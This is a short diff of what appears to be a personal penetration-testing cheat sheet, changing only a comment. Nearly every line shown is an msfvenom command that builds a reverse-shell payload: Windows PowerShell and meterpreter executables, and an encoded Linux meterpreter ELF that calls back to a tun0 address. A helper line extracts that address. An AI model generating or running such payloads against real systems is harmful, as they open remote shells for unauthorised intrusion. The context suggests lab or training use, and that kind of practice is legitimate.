@@ -9,7 +9,7 @@ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f ex
 # windows 64 meterpreter https
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o met.exe
 
-# linux 64 meterpreter
+# linux 64 meterpreter (prependfork run payload in seperate process)
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f elf prependfork=true -t 300 -e x64/xor_dynamic -o shellme.elf
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
